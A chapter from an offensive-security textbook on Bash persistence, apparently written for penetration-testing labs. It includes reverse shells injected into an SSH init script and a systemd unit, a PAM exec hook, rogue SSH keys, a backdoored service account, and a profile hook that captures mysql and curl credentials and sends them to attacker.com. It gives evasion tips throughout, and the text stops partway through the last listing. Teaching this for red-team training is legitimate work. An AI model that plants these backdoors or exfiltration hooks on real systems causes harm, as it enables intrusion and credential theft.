<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch10">&#13;
<hgroup>&#13;
<h1 class="CHAPTER" id="ch10">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_233" aria-label="233"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">10</span></span>&#13;
<span class="CT"><span class="SANS_Dogma_OT_Bold_B_11">PERSISTENCE</span></span>&#13;
</h1>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="COS">By gaining <i>persistence</i> on compromised networks and machines, we can make our access immune to environmental changes such as system reboots, a loss of network connectivity, or even credential rotation.</p>&#13;
<p class="TX">There are many ways to gain persistence. For example, you could plant code on a compromised server that reestablishes your access. Or you could discover virtual private network credentials in a configuration file on GitHub that someone accidentally pushed to a public repository to connect remotely to a network.</p>&#13;
<p class="TX">Bash is a useful tool for gaining persistence, and in this chapter, we’ll use it in several persistence techniques: modifying the scripts used to start system services and interact with authentication modules, harvesting credentials by hooking executed commands, packaging and distributing malicious scripts, hijacking system utilities, and more.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h1-84"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_234" aria-label="234"/><span class="SANS_Futura_Std_Bold_B_11">The Enemies of Persistent Access</span></h2>&#13;
<p class="TNI1">Many factors could interfere with an attacker’s ability to establish persistent access, some of which may not necessarily be under their direct control. Here are a few environment types and security practices that could become a hurdle and hamper persistence of access:</p>&#13;
<p class="ListHead"><b>Ephemeral environments</b></p>&#13;
<p class="ListPlainFirst">Short-lived environments, such as those running containers, may make persistence challenging. Container orchestration platforms and system administrators might spin containers up and down frequently. For example, a system experiencing a decreased system load on a slow weekend may automatically scale down the number of running containers. If we had access to one of those containers, we’d be at risk of losing access.</p>&#13;
<p class="ListHead"><b>Mature security practices</b></p>&#13;
<p class="ListPlainFirst">An organization that implements mature security practices can be a harder target both to compromise and maintain one’s access to. Some organizations review their systems every day for anomalies, harden their infrastructure, scan their environment for possible intrusion attempts, and perform threat hunting. In addition, many organizations have dedicated red teams to test the effectiveness of the controls. These security measures can make it harder to maintain long-term access.</p>&#13;
<p class="ListHead"><b>Network and endpoint security controls</b></p>&#13;
<p class="ListPlainFirst">Fine-tuned network and endpoint security controls implemented across an organization can make persisting access more difficult. A mature blue team will plan a defense-in-depth network strategy to compensate for any control failures.</p>&#13;
<p class="ListHead"><b>Asset life-cycle management and inventory hygiene</b></p>&#13;
<p class="ListPlainFirst">While it doesn’t happen often, asset decommissioning can trigger the loss of persistent access. Similarly, solid patch management could introduce fixes to the vulnerable software used as part of an exploitation kit. Ideally, you should find <i>grip points</i>, additional assets to persist your access to, so you don’t rely on a single vector for your remote access.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h2 class="H1" id="sec2"><span id="h1-85"/><span class="SANS_Futura_Std_Bold_B_11">Modifying Service Configurations</span></h2>&#13;
<p class="TNI1">One way to maintain access to a system is to create or modify the script used to start a system service. To achieve this, you could exploit System V and systemd, system mechanisms that manage services and control the start sequence of processes. System V is the older of the two mechanisms, but you may encounter either tool in a penetration test. Let’s learn about both mechanisms in the context of persistence.</p>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h2-149"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_235" aria-label="235"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">System V</span></h3>&#13;
<p class="TNI1">System V’s <i>/etc/init.d</i> directory contains shell scripts, called <i>init scripts</i>, responsible for starting services, whether they’re network services such as SSH, scheduling services such as Cron, or services responsible for setting up a server’s hardware clock. But we can also write custom malicious logic by using init scripts.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>Introducing custom code into shell scripts under the</i> <span class="note_Italic">/etc</span> <i>directory usually requires elevated privileges. This technique assumes you have write permissions to the target directory.</i></p>&#13;
<p class="TX">Run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">ls</span> command to list the files in <i>/etc/init.d</i> on any of the machines in the lab. Here is the output on <i>p-jumpbox-01</i> (172.16.10.13):</p>&#13;
<pre><code># <b>root@p-jumpbox-01:/# ls -l /etc/init.d/</b>&#13;
&#13;
total 24&#13;
-rwxr-xr-x 1 root root 1071 Feb  5  atd&#13;
-rwxr-xr-x 1 root root 3062 Nov 14  cron&#13;
-rwxr-xr-x 1 root root 3152 Jan 27  dbus&#13;
-rwxr-xr-x 1 root root 1748 Nov 28  hwclock.sh&#13;
-rwxr-xr-x 1 root root  959 Feb 25  procps&#13;
-rwxr-xr-x 1 root root 4060 May 26 14:44 ssh&#13;
</code></pre>&#13;
<p class="TX">Each file in the directory affects the configuration of a particular service. For example, take a look at the <i>ssh</i> script (<a href="chapter10.xhtml#Lis10-1">Listing 10-1</a>).</p>&#13;
<span id="Lis10-1"/><pre><code># <b>cat /etc/init.d/ssh</b>&#13;
&#13;
#! /bin/sh&#13;
<var>--snip--</var>&#13;
case "$1" in&#13;
  start)&#13;
    check_privsep_dir&#13;
    check_for_no_start&#13;
    check_dev_null&#13;
    log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true&#13;
    if start-stop-daemon --start --quiet --oknodo --chuid 0:0 --pidfile /run/sshd.pid \&#13;
                         --exec /usr/sbin/sshd -- $SSHD_OPTS; then&#13;
      log_end_msg 0 || true&#13;
    else&#13;
      log_end_msg 1 || true&#13;
    fi&#13;
    ;;&#13;
  stop)&#13;
    log_daemon_msg "Stopping OpenBSD Secure Shell server" "sshd" || true&#13;
    if start-stop-daemon --stop --quiet --oknodo --pidfile /run/sshd.pid \&#13;
                         --exec /usr/sbin/sshd; then&#13;
      log_end_msg 0 || true&#13;
    else&#13;
      log_end_msg 1 || true&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_236" aria-label="236"/>    fi&#13;
    ;;&#13;
&#13;
  reload|force-reload)&#13;
    check_for_no_start&#13;
    check_config&#13;
    log_daemon_msg "Reloading OpenBSD Secure Shell server's configuration" "sshd" || true&#13;
    if start-stop-daemon --stop --signal 1 --quiet --oknodo --pidfile /run/sshd.pid \&#13;
                         --exec /usr/sbin/sshd; then&#13;
      log_end_msg 0 || true&#13;
    else&#13;
      log_end_msg 1 || true&#13;
    fi&#13;
    ;;&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-1: The init script for the SSH service</span></p>&#13;
<p class="TX">As you can see, the core of this script uses a <span class="SANS_TheSansMonoCd_W5Regular_11">case</span> statement to determine which set of commands to run, given some input. For example, to start, stop, and reload the SSH service, we could call the script in each of the following ways:</p>&#13;
<pre><code># <b>/etc/init.d/ssh start</b>&#13;
# <b>/etc/init.d/ssh stop</b>&#13;
# <b>/etc/init.d/ssh reload</b>&#13;
# <b>/etc/init.d/ssh force-reload</b>&#13;
</code></pre>&#13;
<p class="TX">The system is configured to start SSH on boot, and if we can place custom bash logic in the script, our code will run whenever the script is called. So, if we’re able to create a reverse shell from the init script, we can reconnect the server to our listener in the case of a full reboot, as long as the network is available.</p>&#13;
<p class="TX">Let’s give this a try. Modify the <i>/etc/init.d/ssh</i> file by inserting a reverse shell payload into it, as shown in <a href="chapter10.xhtml#Lis10-2">Listing 10-2</a>.</p>&#13;
<span id="Lis10-2"/><pre><code><var>--snip--</var>&#13;
start)&#13;
  check_privsep_dir&#13;
  check_for_no_start&#13;
  check_dev_null&#13;
  log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true&#13;
  if start-stop-daemon --start --quiet --oknodo --chuid 0:0 --pidfile&#13;
/run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then&#13;
    log_end_msg 0 || true&#13;
  else&#13;
    log_end_msg 1 || true&#13;
  fi&#13;
<b>  ncat 172.16.10.1 4444 -e /bin/bash 2&gt; /dev/null &amp;</b>&#13;
  ;;&#13;
<var>--snip--</var>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-2: A reverse shell payload injected into</span> <span class="SANS_Futura_Std_Book_11">/etc/init.d/ssh</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_237" aria-label="237"/>Next, start a listener to receive the reverse shell on Kali. You can use pwncat, Ncat, Netcat, or any other listener you prefer.</p>&#13;
<pre><code>$ <b>pwncat-cs -l -p 4444</b></code></pre>&#13;
<p class="TX">Finally, switch back to the target system and run the <span class="SANS_TheSansMonoCd_W5Regular_11">service</span> command to start the SSH server daemon:</p>&#13;
<pre><code># <b>service ssh start</b></code></pre>&#13;
<p class="TX">You should see the reverse shell connecting to the listener.</p>&#13;
<p class="TX">Note that when you introduce obviously malicious commands such as reverse shell payloads, you should make these as invisible as possible. For example, try splitting the listener’s remote IP address into a bunch of variables so it blends with the rest of the script and doesn’t stand out to anyone who happens to be reading it.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h3 class="H2" id="sec4"><span id="h2-150"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">systemd</span></h3>&#13;
<p class="TNI1">systemd manages <i>units</i>, which can represent services, devices, and other types of components. To achieve persistence, we could try to use systemd as a way to register a new service unit on the system. <a href="chapter10.xhtml#Lis10-3">Listing 10-3</a> shows an example of a systemd service with a reverse shell payload.</p>&#13;
<span id="Lis10-3"/><pre><code><span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> [Unit]&#13;
Description=RevShell&#13;
After=network-online.target&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> Wants=network-online.target&#13;
&#13;
[Service]&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation3">❸</span> ExecStart=<b>ncat ATTACKER_IP 4444 -e /bin/bash</b>&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation4">❹</span> Restart=always&#13;
&#13;
[Install]&#13;
WantedBy=multi-user.target&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-3: An example malicious systemd service definition file</span></p>&#13;
<p class="TX">This service defines the following properties: a new unit <span class="CodeAnnotation" aria-label="annotation1">❶</span>, a requirement for networking to be available <span class="CodeAnnotation" aria-label="annotation2">❷</span>, an instruction to execute the reverse shell to the attacker’s machine on service start <span class="CodeAnnotation" aria-label="annotation3">❸</span>, and a requirement to restart the process if it dies <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">The containers in the lab don’t run systemd, but if you’d like to experiment with this technique, you could use these commands on your Kali machine. To use the script, create a new service file at <i>/etc/system/service/revshell.service</i>. (The name of the file is also the name of the service. In a real attack, you should probably use a sneakier name so it blends nicely with the environment.) Then enable the service by executing <span class="SANS_TheSansMonoCd_W7Bold_B_11">systemctl enable revshell</span>.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_238" aria-label="238"/>Run the malicious service by using <span class="SANS_TheSansMonoCd_W7Bold_B_11">systemctl start revshell</span>. Now, if the machine ever reboots, this service file should reestablish a connection on boot.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h2 class="H1" id="sec5"><span id="h1-86"/><span class="SANS_Futura_Std_Bold_B_11">Hooking into Pluggable Authentication Modules</span></h2>&#13;
<p class="TNI1"><i>Pluggable authentication modules (PAMs)</i> provide high-level APIs for low-level authentication schemes, and applications can use them to authenticate users. For example, you could adopt an external multifactor authentication provider to prompt users to enter a code or insert a hardware security token during login, in addition to using a traditional password. PAM configuration files live in the <i>/etc/pam.d</i> directory.</p>&#13;
<p class="TX">In terms of establishing persistence, PAM has an interesting capability: it can call external scripts at certain points during an authentication flow by using the <i>pam_exec.so</i> library. By modifying specific configurations, we could make PAM call our own script whenever a user logs in to a system, then take any action we’d like.</p>&#13;
<p class="TX">For example, under <i>/etc/pam.d</i>, you will find a file named <i>common-session</i>. This file includes session-related modules that are common to all services. Modify this file by appending the following line to it:</p>&#13;
<pre><code>session     optional     pam_exec.so seteuid /usr/local/bin/pam-helper.sh</code></pre>&#13;
<p class="TX">The format of this line is as follows:</p>&#13;
<pre><code><var>type - control - module-path - module-arguments</var></code></pre>&#13;
<p class="TX">The type is <span class="SANS_TheSansMonoCd_W5Regular_11">session</span>, the control is <span class="SANS_TheSansMonoCd_W5Regular_11">optional</span>, the module path is <i>pam_exec.so</i>, and the module arguments are <span class="SANS_TheSansMonoCd_W5Regular_11">seteuid</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">/usr/local/bin/pam-helper.sh</span>. The <span class="SANS_TheSansMonoCd_W5Regular_11">session</span> type refers to the actions taken before or after a user is given access to a service, commonly used for actions such as logging. The <span class="SANS_TheSansMonoCd_W5Regular_11">optional</span> control means that no matter whether this module succeeds or not, it won’t impact the authentication or login flow. The module path <i>pam_exec.so</i> is the library we will use to call external programs, followed by the module arguments <span class="SANS_TheSansMonoCd_W5Regular_11">seteuid</span> (set effective UID) and the full path to the script.</p>&#13;
<p class="TX">Once you’ve saved the PAM configuration file, <i>pam_exec.so</i> will call your script whenever someone logs in to or out of the system (for example, by running <span class="SANS_TheSansMonoCd_W5Regular_11">su - backup</span> and providing the password). We’ll provide guidance on writing a suitable persistence script in Exercise 19.</p>&#13;
<p class="HeadAExercise"><span id="exe-19"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 19: Coding a Malicious pam_exec Bash Script</span></p>&#13;
<p class="TNI1">The previous section explained how to modify a system’s PAM configuration to call an external script, <i>pam-helper.sh</i>. This script will run whenever a user logs in to or out of the system.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_239" aria-label="239"/>Build the script’s logic to take malicious actions of your choice. For example, you could use Cron to schedule a persistent task or use At to schedule a one-time task that establishes a reverse shell to a remote machine.</p>&#13;
<p class="TX">Make sure to save your script into <i>/usr/local/pam-helper.sh</i> with executable permissions. You can test this exercise on <i>p-jumpbox-01</i> (172.16.10.13) since you already have root access to it. Don’t forget to set up the reverse shell listener as well.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h2 class="H1" id="sec6"><span id="h1-87"/><span class="SANS_Futura_Std_Bold_B_11">Generating Rogue SSH Keys</span></h2>&#13;
<p class="TNI1">Users with SSH access to a server can use their cryptographic keys instead of their passwords to log in. When we generate an SSH key pair, we must append the public key to a file named <i>authorized_keys</i> under the user’s home directory. Any public key in this file is authorized to authenticate to the system but only when using the account for which the key exists.</p>&#13;
<p class="TX">Because more than one key could be authorized to authenticate, using a rogue SSH key to create a backdoor to an account is as easy as adding another public key to this file. For example, an <i>authorized_keys</i> file for a <i>nostarch</i> user might look like the following, assuming their home directory is <i>/home/nostarch</i>:</p>&#13;
<pre><code>$ <b>cat /home/nostarch/.ssh/authorized_keys</b>&#13;
&#13;
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDB9Rp0Lol7dmnNxiMSlcWXWp5Ruf4XLwo2fgR7ZD&#13;
djMNHIJtbmTXz4WLM34XagYaDFpqsghbE+kYM9HatmK7KY9HDTqC96fX0TW8ky8UChdSvB7oiQjEei&#13;
CRuiqWqarPja6S8ko0LjdAe65n59kT2ClFCKP5XlGgkv/zMpLIfQxyrI4LFGun/Pi+Nef0DfNioBdZ&#13;
lUAmWeOjHyJ+xdpHMdhJSHGuzNx0KRnzZ83mvhgXZAGcr7Pz1NMGxXhjx2TeQzV7Yek+Z2QY6LMFpQ&#13;
e0c8AAvr/bI7+nj0wb27fhM66sOJp+VL+E4vg2t6TaGmrnq5JOG7lbIpXU/BU2KZaSx2E9bDzq5eOi&#13;
AQc8j+WE6Y1Y7r/0pbZ5DuQHoowCzS6r9nX9NU0kI4W9mLQ1vx3mgOUu4eEDF579UX4CIj7nju8ebg&#13;
wHhBaNdaYfmAz5TYgO4P92oqUNoyEm/eyndghpGWkn1U9yuzzCjiQqxpOV6V6Dw0DAyviHta5pYAjX&#13;
CtsYM=&#13;
</code></pre>&#13;
<p class="TX">To generate a new SSH key, run this command on your Kali machine:</p>&#13;
<pre><code>$ <b>ssh-keygen -t rsa -C ""</b></code></pre>&#13;
<p class="TX">We use <span class="SANS_TheSansMonoCd_W5Regular_11">-t</span> (type) to define the type of key (in this case, RSA) and <span class="SANS_TheSansMonoCd_W5Regular_11">-C</span> (comment) with an empty value. If you don’t supply the <span class="SANS_TheSansMonoCd_W5Regular_11">-C</span> flag with an empty value, <span class="SANS_TheSansMonoCd_W5Regular_11">ssh-keygen</span> will append the computer’s hostname to the end of the key as a comment, which is a way to identify the machine that the key belongs to. Follow the wizard, making sure not to set a passphrase for the purposes of this example. Two files should be created: <i>id_rsa</i> (the private key) and <i>id_rsa.pub</i> (the public key).</p>&#13;
<p class="TX">You can add the public key to <i>authorized_keys</i> in multiple ways. Try performing these steps on the <i>p-jumpbox-01</i> machine (172.16.10.13) while logged in as the backup user.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_240" aria-label="240"/>First, you can simply create or modify <i>~/.ssh/authorized_keys</i> by using a text editor and pasting the public key’s content:</p>&#13;
<pre><code>$ <b>mkdir ~/.ssh &amp;&amp; chmod 700 ~/.ssh</b>&#13;
$ <b>touch ~/.ssh/authorized_keys &amp;&amp; chmod 600 ~/.ssh/authorized_keys</b>&#13;
</code></pre>&#13;
<p class="TX">To add the key remotely, you could use an SSH client to authenticate and run a command. Note that this will require you to provide the password of the account you’ve managed to compromise.</p>&#13;
<pre><code>$ <b>cat id_rsa.pub | ssh backup@172.16.10.13 'cat &gt;&gt; .ssh/authorized_keys'</b></code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">ssh-copy-id</span> command makes it slightly easier to copy the public key to the server. It should automatically write it to the correct location:</p>&#13;
<pre><code>$ <b>ssh-copy-id -i ~/.ssh/id_rsa.pub backup@172.16.10.13</b></code></pre>&#13;
<p class="TX">When prompted, enter the password for the backup user.</p>&#13;
<p class="TX">After adding the key, try using the private RSA key to log in to the server:</p>&#13;
<pre><code>$ <b>ssh backup@172.16.10.13 -i ~/.ssh/id_rsa</b></code></pre>&#13;
<p class="TX">You should notice that you’re not prompted to enter the user’s account password. If you had provided a passphrase during key creation, you’d be required to provide this passphrase when using the key for authentication.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h2 class="H1" id="sec7"><span id="h1-88"/><span class="SANS_Futura_Std_Bold_B_11">Repurposing Default System Accounts</span></h2>&#13;
<p class="TNI1">By default, systems come with built-in accounts other than root, such as nobody, sys, sync, bin, games, and man. We call these accounts <i>service accounts</i>, as they’re used for running specific tasks. Separating these tasks into different accounts enforces a least-privilege model, as it enables the system to run applications under particular user contexts.</p>&#13;
<p class="TX">These accounts aren’t meant for users to log in to, and if you look closely at <i>/etc/passwd</i> on any of the lab machines (or even on Kali), you’ll see they usually have no shell or password set. These common hardening practices ensure that they can’t perform system tasks such as job scheduling if compromised.</p>&#13;
<p class="TX">But if you’ve compromised a machine and gained access to a root account (or a <span class="SANS_TheSansMonoCd_W5Regular_11">sudo</span> user with the ability to create or modify users), you could take measures such as the following to craft a backdoor mechanism that blends into the environment:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Creating a new account that looks similar to a service account</li>&#13;
<li class="ListBullet">Modifying an existing service account by adding a shell and password to it</li>&#13;
</ul>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_241" aria-label="241"/>Let’s convert a service account into a backdoor account that grants us ongoing access to the system. We’ll target the <i>p-jumpbox-01</i> machine (172.16.10.13), where we have root access.</p>&#13;
<p class="TX">We’ll backdoor the lp account, which is usually used for managing spooling services. You can see this account and its default shell in <i>/etc/passwd</i>:</p>&#13;
<pre><code>$ <b>grep lp /etc/passwd</b>&#13;
&#13;
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&#13;
</code></pre>&#13;
<p class="TX">As you can see, the account has the <i>/usr/sbin/nologin</i> shell; this won’t allow us to log in. Let’s modify the default shell by using <span class="SANS_TheSansMonoCd_W5Regular_11">usermod</span> and passing it the <span class="SANS_TheSansMonoCd_W5Regular_11">-s</span> (shell) argument:</p>&#13;
<pre><code># <b>usermod -s /bin/bash lp</b></code></pre>&#13;
<p class="TX">We recommend learning more about the <span class="SANS_TheSansMonoCd_W5Regular_11">usermod</span> command by running <span class="SANS_TheSansMonoCd_W5Regular_11">man usermod</span>. Next, set a password with the <span class="SANS_TheSansMonoCd_W5Regular_11">passwd</span> command and enter a password when prompted:</p>&#13;
<pre><code># <b>passwd lp</b></code></pre>&#13;
<p class="TX">Finally, check that you can SSH into the server by using the lp account:</p>&#13;
<pre><code>$ <b>ssh lp@172.16.10.13</b></code></pre>&#13;
<p class="TX">You should be able to remotely connect to the machine by using this service account, which should now have a valid shell. You can use this as a backdoor account if you lose root access in the future, or if the root account is disabled for remote logins.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h2 class="H1" id="sec8"><span id="h1-89"/><span class="SANS_Futura_Std_Bold_B_11">Poisoning Bash Environment Files</span></h2>&#13;
<p class="TNI1">In <span class="Xref"><a href="chapter2.xhtml">Chapter 2</a></span>, we discussed files such as <i>~/.bashrc</i>, which let us define variables, aliases, and scripts to customize the environment. In addition to these files, which live in a user’s home directory, there are system-wide <i>.bashrc</i> and <i>.profile</i> files, located at <i>/etc/bash.bashrc</i> or <i>/etc/bashrc</i> and <i>/etc/profile</i>, respectively.</p>&#13;
<p class="TX">When bash is invoked as an interactive login shell, it will read from <i>/etc/profile</i> (if it exists) before reading user-level environment files such as <i>~/.bash_profile</i>, <i>~/bash_login</i>, and <i>~/.profile</i>. Similarly, when bash is invoked as a nonlogin interactive shell, it reads the global <i>bashrc</i> file before the local one.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_242" aria-label="242"/>Also, <i>/etc/profile</i> will look for files under the <i>/etc/profile.d</i> directory. If files exist, it will use the <span class="SANS_TheSansMonoCd_W5Regular_11">.</span> command to source (or import) them. You can see this behavior by running <span class="SANS_TheSansMonoCd_W5Regular_11">cat /etc/profile</span>:</p>&#13;
<pre><code>$ <b>cat /etc/profile</b>&#13;
&#13;
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))&#13;
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).&#13;
&#13;
<var>--snip--</var>&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> if [-d /etc/profile.d]; then&#13;
<span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> for i in /etc/profile.d/*.sh; do&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> if [-r $i]; then&#13;
    <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> . $i&#13;
    fi&#13;
  done&#13;
  unset i&#13;
fi&#13;
</code></pre>&#13;
<p class="TX">As you can see, an <span class="SANS_TheSansMonoCd_W5Regular_11">if</span> condition <span class="CodeAnnotation" aria-label="annotation1">❶</span> checks whether <i>/etc/profile.d</i> is a directory. Next, a <span class="SANS_TheSansMonoCd_W5Regular_11">for</span> loop iterates on all files with a <i>.sh</i> extension under <i>/etc/profile.d</i> <span class="CodeAnnotation" aria-label="annotation2">❷</span> and checks each file for read access by using <span class="SANS_TheSansMonoCd_W5Regular_11">-r</span> <span class="CodeAnnotation" aria-label="annotation3">❸</span>. Finally, the script imports the file by using the <span class="SANS_TheSansMonoCd_W5Regular_11">.</span> command <span class="CodeAnnotation" aria-label="annotation4">❹</span>.</p>&#13;
<p class="TX">If we can write malicious code to files such as <i>/etc/profile</i> or into a directory such as <i>/etc/profile.d</i>, we could invoke shells running custom code under our control. If you’ve compromised a specific user account, you might also try planting malicious code in that user’s shell environment file, which may lead to interesting results and doesn’t require root access. However, the impact will be user specific.</p>&#13;
<p class="TX">Let’s try tampering with a user’s profile by introducing custom code that will run immediately after a user executes a command. Log in to <i>p-jumpbox-01</i> (172.16.10.13) as the backup user and create a <i>.profile</i> file:</p>&#13;
<pre><code>$ <b>touch .profile</b></code></pre>&#13;
<p class="TX">Next, write the script in <a href="chapter10.xhtml#Lis10-4">Listing 10-4</a> into the file and save it.</p>&#13;
<span id="Lis10-4"/><pre><code>#!/bin/bash&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation1">❶</span> hook() {&#13;
  echo "You executed ${BASH_COMMAND}"&#13;
}&#13;
&#13;
<span class="codeannotated_CodeAnnotation" aria-label="annotation2">❷</span> <span class="SANS_TheSansMonoCd_W5Regular_11">trap 'hook' DEBUG</span>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 10-4: Hooking an operating system command</span></p>&#13;
<p class="TX">First, we create a function called <span class="SANS_TheSansMonoCd_W5Regular_11">hook</span> <span class="CodeAnnotation" aria-label="annotation1">❶</span>. This function does only one thing, which is print <span class="SANS_TheSansMonoCd_W5Regular_11">You executed ${BASH_COMMAND}</span> to standard output, where <span class="SANS_TheSansMonoCd_W5Regular_11">${BASH_COMMAND}</span> is an environment variable that holds the name of the command about to be executed.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_243" aria-label="243"/>At <span class="CodeAnnotation" aria-label="annotation2">❷</span>, we use the <span class="SANS_TheSansMonoCd_W5Regular_11">trap</span> command followed by the function name (<span class="SANS_TheSansMonoCd_W5Regular_11">hook()</span>) and the word <span class="SANS_TheSansMonoCd_W5Regular_11">DEBUG</span>, which is a type of <i>signal spec (sigspec)</i> that the trap accepts. A sigspec can be any of these values: <span class="SANS_TheSansMonoCd_W5Regular_11">EXIT</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">DEBUG</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">RETURN</span>, or <span class="SANS_TheSansMonoCd_W5Regular_11">ERR</span>; <span class="SANS_TheSansMonoCd_W5Regular_11">DEBUG</span> ensures that we trap every command executed. (In Exercise 20, we’ll put this sigspec to use to steal sensitive data.)</p>&#13;
<p class="TX">Finally, here’s the source file:</p>&#13;
<pre><code>$ <b>source .profile</b></code></pre>&#13;
<p class="TX">Now run a few commands and observe the output. In the following example, we run <span class="SANS_TheSansMonoCd_W5Regular_11">id</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">ps -ef</span>:</p>&#13;
<pre><code>backup@p-jumpbox-01:~$ <b>id</b>&#13;
You executed id&#13;
uid=34(backup) gid=34(backup) groups=34(backup)&#13;
&#13;
backup@p-jumpbox-01:~$ <b>ps -ef</b>&#13;
You executed ps -ef&#13;
UID  PID  PPID  C STIME TTY     TIME CMD&#13;
root   1     0  0 01:31 ?   00:00:00 /bin/sh -c service ssh restart  &amp;&amp;  service cron restar...&#13;
root  16     1  0 01:31 ?   00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups&#13;
</code></pre>&#13;
<p class="TX">As you can see, our active hook prints the command we executed just before the output of that command.</p>&#13;
<p class="HeadAExercise"><span id="exe-20"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 20: Intercepting Data via Profile Tampering</span></p>&#13;
<p class="TNI1">In this exercise, you have a clear malicious goal: write a script that captures any command executed on the compromised system that might contain sensitive information, then transmit it to a remote server. If you’re unsure of which commands could be interesting to intercept, we have a few examples in our back pocket:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Web requests that contain an API key parameter</li>&#13;
<li class="ListBullet">Passwords passed on the command line to common utilities, such as database administration tools like MySQL or Redis</li>&#13;
<li class="ListBullet">PII such as emails or credit card numbers passed on the command line</li>&#13;
</ul>&#13;
<p class="TX">In addition, here are a few high-level tips to get you going:</p>&#13;
<ul class="ul">&#13;
<li class="ListBullet">Run a web search for string patterns that match the sensitive data you’re interested in. For example, look for commands that can accept passwords or even credit card numbers.</li>&#13;
<li class="ListBullet">Identify specific commands you want to intercept; avoid intercepting every command, to make your data collection precise.</li>&#13;
<li class="ListBullet">Design your script such that it fails safely. If something goes wrong while sending the data over the network, catch the error so the information doesn’t leak to the unsuspecting user.</li>&#13;
</ul>&#13;
<p class="TX"><a href="chapter10.xhtml#Lis10-5">Listing 10-5</a> provides one solution, which targets <span class="SANS_TheSansMonoCd_W5Regular_11">curl</span> or <span class="SANS_TheSansMonoCd_W5Regular_11">mysql</span> commands used to transmit credentials.</p>&#13;
<span id="Lis10-5"/>&#13;
<p class="CodeLabel"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_244" aria-label="244"/><span class="codelabel_Italic">profile_hook.sh</span></p>&#13;
<pre class="pre"><code>#!/bin/bash&#13;
&#13;
hook() {&#13;
<span class="Code_CodeAnnotation" aria-label="annotation1">❶</span> case "${BASH_COMMAND}" in&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span> mysql*)&#13;
    <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span> if echo "${BASH_COMMAND}" | grep -- "-p\|--password"; then&#13;
        curl https://attacker.com \&#13;
              -H "Content-Type:application/json" \&#13;
              -d "{\"command\":\"${BASH_COMMAND}\"}" \&#13;
              --max-time 3 \&#13;
              --connect-timeout 3 \&#13;
              -s &amp;&gt; /dev/null&#13;
      fi&#13;
     ;;&#13;
  <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span> curl*)&#13;
    if echo "${BASH_COMMAND}" | grep -ie "token" \&#13;
                                     -ie "apikey" \&#13;
                                     -ie "api_token" \&#13;
